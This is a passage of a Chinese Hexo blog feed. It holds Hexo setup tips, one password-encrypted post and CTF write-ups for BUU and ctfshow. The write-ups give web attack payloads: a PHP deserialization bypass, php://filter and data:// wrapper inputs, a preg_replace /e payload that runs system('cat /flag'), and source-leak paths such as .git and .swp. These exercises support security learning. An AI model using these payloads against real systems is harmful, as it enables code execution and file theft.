        <content type="html"><![CDATA[<p>1.同样，进入根目录_config.yml配置文件，进行如下操作，没有就添加，有就修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">enable: true</span><br></pre></td></tr></table></figure><p>2.找到你想要加密的文档，在文章信息头部添加信息，但是这里要注意，添加的时候冒号后面必须有一个空格才可以哦！！</p><p>举例如下：</p><p><img src="/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20135655.png" alt="屏幕截图 2024-06-07 135655"></p><p>3.然后重新hexo执行后，再次访问就需要密码才能查看文章啦，快去试试吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jr渗透测试仪</title>
      <link href="/2024/06/07/Jr%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%AA-1/"/>
      <url>/2024/06/07/Jr%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%AA-1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="31a1a6156ce7c231a470862e1c1e9a492c50b69252b20a707ead62420f052199">808f957c8f3dcb8d024b1b97590380807c93bee142cb37608bee1e8e13d2b15b97c8aa38fb675c23136ad36fdbfc4d1fa509fc97ccebad996aa08d3724d8e7696eba2610ab964a4ce1ebe8c7c2774b4c960959d0a7af77b288598625eedfd200f826b6d2e6520e7f42f44b2af26ac0738c3c3a905023f7b2bfecd3a4c58b0184a02531781c38d53e6e1ac75108dbab914a75699f6160a2204b8b2b24fc9028d280a2fcd7a44bcccdd50a5e0e9d03ec981608b9a5765ce1caedf31d941db279da991ed11c361c1e09dc83eb54c4f2b08db779cf151af55a1f73fb1445a8691eb6f0216efbf11d6ad6173997dd19992bbd46f81a0a173d19c050bbebfff11f76bdebe69bfd5df28a80945a80512ce837c7a52d9de659c3aa8ca29490652a3ae97aa030b6505b57664216e6f9f7f0cd31996b21fabf0622a76cb4af2d1186aab4a00a03a8a8d7ff8fdee41e55809c9ed89b0a6242300628ca58fbb9ec4645cf0647607fb83f935ef568d0fee37ab8f18358d66a3f90ed76fba09fd074f7e8e9411260caae90cdc10822db9d731e2937936d64b05be4335cb6da6800fe6976ed351977606178609c3b7e712acf1b3adee074f7e3ed671862ae919d6ca8b6b23ac202bb9c5392a8b137f96b389e41c0e7a6637cade50e8dffd55670d4ecb6f5b0960aa02a41c4d4d08cc9065f75bdabb9579bac0c81efc92947644b7f94e1d794494a339be504cbea96211d1090a45ed8885a686bf93739fafce6f5d36bde0660a1d3e29a23d7443ffcc731c2e6dbdeb0c893628c997247ed8598d9941abfbf512126631820c54cf9b666d0b1c81eb24d54d48ce52a543cd3253ec4582dee3d2ec4943eb8a17cdb5b68c50ab80635caa5927b24febed4e11ac6824913162886d54b74bf6e771fd7133656697470754f61e52845fc51ef2ab99189f7bbcb494a2c304d458e4946b6046f7d1f91f23b6e865bb89172dddd2a474fc5a48d41dca0c80fada52f70a278a2c380841515f8def5a86d5bbb9e7e0f57bda7410cc3dbff653cd07c5a5f3390db71d14f7257d517e3a0559d65e3605f93d2ed5aa76f762b9c7b1dcbfdfb55fe906aa506578b42291c5033640692882b3fb3e6d12a633499bb7068645028f63ec17011b7825245759faf4c835c9d4d443e0f038cc29d0f49f7d899acb972a568129c3920a966bcac51ddfe43cd01d51df6b742405a705bb1695d406a7e2f1b034c09d9b95c0c973eeacef24d386d3f124994a0c2434c1a8ea385a65178c30b5591785737a206c8ded9ccb2b39f62aa86a6574cfaef346a7dc649680bed64f3dad0abeba9682ed4fcb9bb981275fa8b22fb320715ebd6c082d4fb9354b02b2560fa7ea45b48469aac0e3ddea70585986d07a0bf3910b89d64c41ab602d3e0c5c74365aab20bbf3464dacbbf1f6e441f2dd5271621e614d34ac4789bf605d7a51c87be745c296ca72e10f854528a1aa6a1cacb8abd14fe4329bcc7f16af41bb4bdf7b79dae8650366f3b50fee7482fdef1e1be93add4c3e4deca1c42e5a919973b231d841955ed3fa581b33d7c86a2b67ce7c941275c29ab0b322e5de845391e9134c9921e905e3dcac41ee74be54bbedbf70fab37496ed69697907f1a002798d56927aa4ad9f8b8a2e2dc8ffe4b903726c3bcfa133e4baaa84411cb7aa44e0702028543d84dd3634606c86685691fb2aa3f8433d3d047c16d2e549ed4ec4c5f2671b962a57cd4825d1ec898f3ec4428cf9380421a15ff340edf03bf1a7dd04c9d488e1cea1754bacd48529cda1f23ea26a2e5091a5beacbea38852b1551d9259bbd5f632efec1528a34a94a5b5d2e0a3d4bfd8cfeb7a8f05d133c3f6620ed3c0b49bb3359198cd268d808edf87ddb082d38d5cdef3fa7636992328957881f0c8e41397ed6e581a38794225138398ddcd76a523d16995c3d1002376051693e03a5f466aa8dcea2d63891623c9d3c7a7caafdae014b2706ee30b45163b67ac2c2ceead3fa93156b5c2b7d030edcf56c479c2f31e504c5d6702e687404c99508709f398a66e6f35ef36f2dfe959a58a03479c19bead26396d3ccbf8884b63d45e68e63cfbcb002074bca82cd8c933a54984d5e515207cfe6bb0efc9ce4cbcb00508d4daa68d66ecd407c657120753ccfcd38721aa3399e69a7c55129a27b31d76e26f130b29a974791f6d75a812420eb78e2f587660194f2cbcdd8047a6479f7ff4b35a991d5d674c2a239b64dc4425ef14212987aa4202d807edd872dfe02625cdb02aa8cfb32bbc0403f2031b968dd247b3d8cdaf529f470f4bd3b03102a694586a809dad80d27bdd87d875664e47d27a4a925b8a337b43d9c6dd68f5e2ac19f1af32df7d0dd03822cdad5af91936df33366749f88ce27292357b65c038a3a250eec9ab1a40ab4b71c655c385ba3d5a1aa3b104ad0e8b3c5df411c6398b045ff1fe3709a4989086598ff1d7ef364a13f7633219391469f4887091b025a8c0340221f4e641263ef613918f634085a24d8668b8ebbf3be7c4d2417e8da0279246c479a89b67c00397326f31627ee4affc87815573de04cbd00e735dcfd0defef1cd3c91fd3ceb1b2465f5012eec74e784cfaf32f55be8a3d597aa789fd7e21056064bd754a1804a38dd0d8dabd5076f162f299483b074c889b8e3b9e67dda0132ccde0afcb391e3dca5c61b115d5f5c3896b9e981062cdf2920d8eac19deeb8057daa4ea9792b8951601df59df74bef6db1d361af07c7220943e2d8f9f7d05fcd26641ebe4be3a7a11dc59eddf408c54ddaa19995666af17fc09206c3897a37dec0e3e57d4b9f7e5dcadf67e3b875899fbd2cb3125eeb29f46a91f9be572d142c8755a006252e0a47c1bf8185de6113f440c28d954f55bd321f4cdda1c9f49e2b37446bf5b682f1a9255726488d3ba3e948cf7a03609dd8a7655c278793d885aa19091adca31b4c3f0be6e55951dbe9b806fad7ce8fd7223a2e98fdbfdf8206e8646be139bbf3dc6a4bacdbe784f5d8a90bc8506c9d8b158fc13775fba6ba9307b3401f6722edde5e5c7a7b062774e4722e2ac0417c5972dab89de600943c57aa5544bc372ef4ac8fc4ebfea0dd6a6de2bb6d7bc11f989a72271ed662aaef96b05ad2bfe0db6d568cbfb179961c09328c93126d0425802b7c3fcc1213ef57e8a816649ab81070cc92a8eec789ab9a8450ab47bfc3777cebd20dc42ae8bf9388fb30b5fce8dd4ad9c7b8e35665ed1641ae5b218ff92655b8c35a9f28d1c787a8c63f71e85012b2048fe512b9b8a3fc292e24830db8d2b99a3d5c4c658f19e55656c71d90206409d92361488fef275b5ebe7e758419ed1ae8dbb6a1f00e8354ad4a4db3425d506bfd7df0a8f9fad10429f534536c93e729adace3d636dae38d9e31282f955d5aa2dda447f85fd6fb08da7fc742f46e34344161781f7d97c0184f16681509ac1b55c4709c31774bab87c7ed6017d900e9e6e3d1fc1b7468d22402b66ccfec94aba0e9baa07c3f75ac0ad5d83a08911051939bb6ae705c6d0083947da6de52132902a28fb6e3d4f25f58a066289b8b002726f997c1aee9e10da6532e504ac17c6791ee6e5dbd4bb9bd0bd211a61d1cc04d0314fbf131957c21f94a772d0e706734f28dfa46eac8115c3cd37860943b3a1631b554b076e6d4994a26168e1bb72aa9e09a99d8cfa99cdeeb0d50cda53007ee0520c5fdbcd610eadc6460c42f2385c44cb1cc20763648e677e2a83b7989b8876dda1458b3a33c0c98c45dfd2da7525a23ea481f1f1e668b4b64750da8ed44e92e5f61b5929566fe939776888490c9a5224e2d80f68ea0d3c3abb862c05693f2f7dab9b7dcad63fd9ce47b97ae80916d3b1fae91d94f48dfdce402a14434e6e981165ddee75cf02082440149511691d08845448ed7ad4c1b07333808a61fd864e9d8056051b2948d13a7a02fdfce20db2487fad6a913c9ba1f88969eb91d0072fc0b2d77cb926c174369a78f7462fa64edba72012c0b108bbe177baa867523182ca4689d25bcec3d8ac1206f726bbea14464091312aa2a59cc51f662f91afe0b8cc924c18ef78f2af0ea7442f7dc545c0bd3ee88283618f85ff2c861945100ad58e12ab8aa75b0dc5a9ca87401a757da06b71d143be1e420206f65a869be786c47e9e00f59b2c29d7663120b59a8fb388fa859053f37eb0dc5a7edff5eddfd5ec6a0fbe4b9d5659d4eb8b37f3267ca8d284e3194c0685efaa8603d425eefa59b80f5cb4c8c2a29b71bba566bbf7680af3da55cd63f4a791a27615642c25b3b33b2ed43401bb68b28f0ca0208f19e4fa18ffad33246ec75350e7da189c140da2a921240641bbc83a33f67d35e3339e227a5a6ba6b3b3309ead1d52ade7aec1311c30973a0ffef8ba8cb9daeb60051f1eb2e09c1896d410a7db227de54a5826fa499334967e2394ca73b5ae015956875a95a2ed191859fa06e7e083521ff5f090e85347bece9669ac64ae26bbb7000e74a21316394297f1181c2f737e7544ef74729034adbf4de8b243b8559b32de0b6d521535406da609002c6c3af4a60a183e864b649622f9b1c526604f8a2177f6f1effca562faa435f9d64a71952e5b16c99e411851214bbf62905ca92b28ba95fb7ed942cbdc57b016282dd61b72cfc1399c318e06b046bd697a3601d5f8693bd76e0391b997d1f6ceac68a3cd3d62353e866649d95547f6cc677100c5e47dfa5505d62bd10bf25599e9b14b5ccc5bc1b8f0fd2758d334d5252f3114df1ed991f0fd8f4eb8c66486a5d949a2c581cc32f6481d11aac40e5c0871d973c533043a1a1e049dbb957c6888eb1442fda32ef333fc6a49e5041463e820ca8c2659577696cd8b61c3ad4ca12b3e2b14cdaa6e941cbb834e47e00df6c1b3bb9a1ae763076aae8167412fc1e0e8588ba4c154cd8a73c536da688d5e49d89d1fedab86390709414c8ad81bab10840ebe75108dd422a8148b28407f6c5715fe2da72d3b5b5dc744c6ed58c29cb1cb6be71c1a0c102bbef8529baca10e07da64d03ef36f62c75f00e4017991433d9230f75d0c33c9f270d1bf9c37c49b8f8b23bc7c43454fb047b99f462550b8d9131ff32566fa1e79b125e2a9dcdf81e279c62e7a2e2e3cd81019f128637cb8fb66fe977be9364f68fecab4e01f03bf5e56</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo之插入图片</title>
      <link href="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo之插入图片"><a href="#hexo之插入图片" class="headerlink" title="hexo之插入图片"></a>hexo之插入图片</h2><p>​参考了网上许多文章，都解决不了问题，然后经过我照猫画虎的多次尝试(也就几个小时吧😅)，找到了一个还能凑合的方法(但是感觉很麻烦😅，以后会造成个问题，且就这样吧先，没办法，不然得被这个问题困一天，先用着吧)。具体如下：</p><p>1.根目录下的_config.yml配置文件里面的post_asset_folder设置为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即post_asset_folder: true</span><br></pre></td></tr></table></figure><p>2.上述完成后，利用hexo新建文档，如hexo new test，此时，它会自动在与test.md同目录下新建一个名字相同的文件即test文件，然后把你要显示的图片放在这个文件夹中。</p><p>3.打开Typora</p><p> 找到导航栏的文件–&gt;偏好设置–&gt;选择图像，然后像下面一样配置，它会在同目录下新建一个名为assets的文件夹，这样以后所有用到的图片都会被再次保存在这里面</p><img src="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/a.png" alt="a" style="zoom: 33%;"><p>4.插入图片</p><p>如下，到插入本地图片这一步之后，一定要注意！！！一定是在第二步中的文件夹里面选择插入的图片，不然上传之后显示不出来(血的教训啊)。</p><img src="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20133143.png" alt="屏幕截图 2024-06-07 133143" style="zoom:50%;"><p>5.然后编辑，保存即可。</p><p>然后就可以上传查看是否显示成功啦。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s   静态查看</span><br><span class="line">hexo d </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题</title>
      <link href="/2024/06/01/buu%E5%88%B7%E9%A2%98/"/>
      <url>/2024/06/01/buu%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h2><p>​    这道题直接用md5数组绕过以及反序列化，反序列化这里直接把$correct的值赋给$unput即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new BUU();</span><br><span class="line">$a-&gt;input=&amp;$a-&gt;correct;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>​这道题分两步：<br>第一步：绕过file_get_contents()     伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.绕过file_get_contents()两种方法</span><br><span class="line">(1)$text=data://text/plain,I have a dream   或者text=data://text//plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br><span class="line">(2)$text=php://inut</span><br><span class="line">然后post发送I have a dream</span><br><span class="line">2.伪协议</span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">base64解码得到源码</span><br></pre></td></tr></table></figure><p>第二步 preg_replace   命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">return preg_replace(</span><br><span class="line">&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">&#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">$str</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p>知识：preg_replace(要搜索的字符串，要替换的字符串，原始字符串)第一个参数以&#x2F;e结尾时，会存在命令执行漏洞，即如果有&#x2F;e，且匹配到了符合正则的字符串,第二个参数将被执行，而这里的strtolower(“\1”)即strtolower(“\1”),\1有自己的意思，即取出正则表达式匹配后子匹配表达式的第一项，就是取出匹配到的{${phpinfo()}},再转化为字符串，即”{${phpinfo()}}”,然后执行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vip限免</title>
      <link href="/2024/05/31/vip%E9%99%90%E5%85%8D/"/>
      <url>/2024/05/31/vip%E9%99%90%E5%85%8D/</url>
      
        <content type="html"><![CDATA[<p>1.源码泄露</p><p>查看源码即可</p><p>2.前台JS绕过</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure><p>我的回答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3种方法：</span><br><span class="line">1.浏览器禁用js后刷新即可     </span><br><span class="line">地址栏输入：about:config</span><br><span class="line">    找到 javascript.enabled 将其转换为false</span><br><span class="line">2.Ctrl+U查看源代码</span><br><span class="line">3.开发者工具</span><br></pre></td></tr></table></figure><p>3.协议头信息泄露</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure><p>我的回答:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包，或者在firefox在网络那一栏的消息头里面可以看到</span><br></pre></td></tr></table></figure><p>4.robots后台泄露            </p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure><p>我的回答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url后加上robots.txt后，得到信息，在重新访问/flagishere.txt</span><br></pre></td></tr></table></figure><p>漏洞原理及危害： 网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。 搜索引擎可以通过robots文件可以获知哪些页面可以爬取，哪些页面不可以爬取。robots.txt文件可能会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p><p>5.phps源码泄露            </p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure><p>访问index.phps，打开即可</p><p>6.源码压缩包泄露</p><p>url+<a href="http://www.zip,之后再访问url+fl000g.txt,得到flag/">www.zip，之后再访问url+fl000g.txt,得到flag</a></p><p>7.版本控制泄露源码            </p><p>.git泄露，url+.git</p><p>8.版本控制泄露源码2            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目:版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p>.svn泄露，url+.svn</p><p>9.vim临时文件泄露            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述:    </span><br><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure><p>访问&#x2F;index.php.swp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理:</span><br><span class="line">vim临时文件泄露 vim是linux自带且常用的文件编辑器，vim在编辑时会生成一个隐藏的临时文件，当vim非正常关闭时这个文件就会被保留下来。 使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问/index.php.swp下载备份文件，用记事本打开即可 。</span><br></pre></td></tr></table></figure><ol start="10"><li><pre><code>         cookie泄露</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述:</span><br><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure><p>直接查看cookie</p><p>11.域名txt记录泄露            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br><span class="line">5月30日 修复，目标地址为**flag.ctfshow.com**</span><br></pre></td></tr></table></figure><p>使用在线网站：<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p>现在好像解不出来了，参考了下其他人的wp,答案是flag{just-seesee}</p><ol start="12"><li></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc冲关1</title>
      <link href="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/"/>
      <url>/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/</url>
      
        <content type="html"><![CDATA[<p>1.杂项签到</p><p>使用zip工具发现没有加密，那就是zip伪加密，修改第二个源文件PK的504B0102 xxxx 0900 0800，重新打开即可</p><p>zip伪加密知识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">原理：zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</span><br><span class="line"></span><br><span class="line">背景：**一个 ZIP 文件由三个部分组成：**</span><br><span class="line"></span><br><span class="line">压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 </span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">压缩源文件数据区： </span><br><span class="line"> 50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line"> 14 00：解压文件所需 pkware 版本 </span><br><span class="line"> 00 00：全局方式位标记（有无加密） </span><br><span class="line"> 08 00：压缩方式 </span><br><span class="line"> 5A 7E：最后修改文件时间 </span><br><span class="line"> F7 46：最后修改文件日期 </span><br><span class="line"> 16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line"> 19 00 00 00：压缩后尺寸（25） </span><br><span class="line"> 17 00 00 00：未压缩尺寸（23） </span><br><span class="line"> 07 00：文件名长度 </span><br><span class="line"> 00 00：扩展记录长度 </span><br><span class="line"> 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line"> 压缩源文件目录区： </span><br><span class="line"> 50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line"> 3F 00：压缩使用的 pkware 版本 </span><br><span class="line"> 14 00：解压文件所需 pkware 版本 </span><br><span class="line"> 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） </span><br><span class="line"> 08 00：压缩方式 </span><br><span class="line"> 5A 7E：最后修改文件时间 </span><br><span class="line"> F7 46：最后修改文件日期 </span><br><span class="line"> 16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line"> 19 00 00 00：压缩后尺寸（25） </span><br><span class="line"> 17 00 00 00：未压缩尺寸（23） </span><br><span class="line"> 07 00：文件名长度 </span><br><span class="line"> 24 00：扩展字段长度 </span><br><span class="line"> 00 00：文件注释长度 </span><br><span class="line"> 00 00：磁盘开始号 </span><br><span class="line"> 00 00：内部文件属性 </span><br><span class="line"> 20 00 00 00：外部文件属性 </span><br><span class="line"> 00 00 00 00：局部头部偏移量 </span><br><span class="line"> 6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line"> 压缩源文件目录结束标志： </span><br><span class="line"> 50 4B 05 06：目录结束标记 </span><br><span class="line"> 00 00：当前磁盘编号 </span><br><span class="line"> 00 00：目录区开始磁盘编号 </span><br><span class="line"> 01 00：本磁盘上纪录总数 </span><br><span class="line"> 01 00：目录区中纪录总数 </span><br><span class="line"> 59 00 00 00：目录区尺寸大小 </span><br><span class="line"> 3E 00 00 00：目录区对第一张磁盘的偏移量 </span><br><span class="line"> 00 00：ZIP 文件注释长度</span><br><span class="line"></span><br><span class="line">测试：若把文本区原来显示PK的50 4B改成其他数据，也不可读</span><br></pre></td></tr></table></figure><p>2.misc2</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偶然发现我竟然还有个软盘，勾起了我的回忆。</span><br></pre></td></tr></table></figure><p><img src="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240531145011031.png" alt="image-20240531145011031"></p><p>我的解答:</p><p>随便选择一个虚拟机，编辑虚拟机设置，选择添加，选择软盘驱动器，选择使用软盘映像文件，然后重新打开虚拟机即可。</p><p><img src="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240531145752783.png" alt="image-20240531145752783"></p><p>3.miscx</p><p>给了2个加密txt文件，一个zip(一个图片，一个加密.doc文件)</p><p>信息：rot,or,2020</p><p>猜测2020为密码，将.doc文件成功打开(这里使用word打开i，不然其他方式打开都是乱码，血的教训 啊😿)，音符解密，一眼rabbit,猜测密码仍为2020</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：welcome_to_payhelp</span><br></pre></td></tr></table></figure><p>刚好打开hint.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 